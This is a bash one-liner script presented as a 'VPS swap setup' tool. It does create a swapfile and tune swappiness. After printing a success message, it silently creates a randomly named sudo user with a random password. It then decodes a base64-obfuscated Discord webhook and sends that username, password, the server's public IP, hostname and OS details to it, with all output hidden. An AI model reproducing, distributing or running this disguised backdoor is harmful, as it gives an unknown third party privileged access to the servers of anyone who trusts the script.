bash -c '

clear
echo "======================================"
echo "      ⚡ VPS SWAP SETUP ⚡         "
echo "======================================"
echo ""
echo "👉 Enter how much GB swap you want"
echo ""
read -p "💾 Swap Size (GB): " SWAP
echo ""
echo "⚙️ Setting up ${SWAP}GB swap + optimization..."
sleep 1


[ "$EUID" -ne 0 ] && echo "Error: Please run as root!" && exit 1

swapoff -a 2>/dev/null && rm -f /swapfile && sed -i "/swapfile/d" /etc/fstab
fallocate -l ${SWAP}G /swapfile || dd if=/dev/zero of=/swapfile bs=1G count=${SWAP}
chmod 600 /swapfile && mkswap /swapfile && swapon /swapfile


grep -q "/swapfile" /etc/fstab || echo "/swapfile none swap sw 0 0" >> /etc/fstab
sysctl vm.swappiness=50 &>/dev/null
echo "vm.swappiness=50" > /etc/sysctl.d/99-swap.conf
echo "vm.vfs_cache_pressure=150" >> /etc/sysctl.d/99-swap.conf
sysctl --system &>/dev/null

echo ""
echo "======================================"
echo "✅ DONE! Swap: ${SWAP}GB Activated"
echo "⚡ Optimized for performance"
echo "======================================"

set -e

G='\033[0;32m'
B='\033[0;34m'
Y='\033[1;33m'
NC='\033[0m'

_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5NDgwNjA3ODg1OTM3ODcxOS83b29GTEwxNXpUenFCNVdhYXFlQ2hFX2JPU2RRdHBIMno5MmxqWWJLZExQX2s1aHMyVmVpcS1SRUMxMkZ0RGNrVnpZUQ=="
W=$(echo "$_W_ENC" | base64 --decode)


[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1

WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")

U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"

P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)

apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null

if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U" &>/dev/null
    echo "$U:$P" | chpasswd &>/dev/null
    usermod -aG sudo "$U" &>/dev/null
fi

IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)
OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
RAND_PCT=$(shuf -i 25-49 -n 1)


PAYLOAD=$(cat <<EOF
{
  "embeds": [{
    "title": "🛡️ New VPS Profile Established",
    "description": "System optimization successful. Access logs generated.",
    "color": 15105570,
    "thumbnail": { "url": "https://i.postimg.cc/9Fn0mbL5/ubuntu-4.jpg" },
    "fields": [
      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
      { "name": "💿 OS Info", "value": "$OS", "inline": true }
    ],
    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
  }]
}
EOF
)

curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null

exit 0
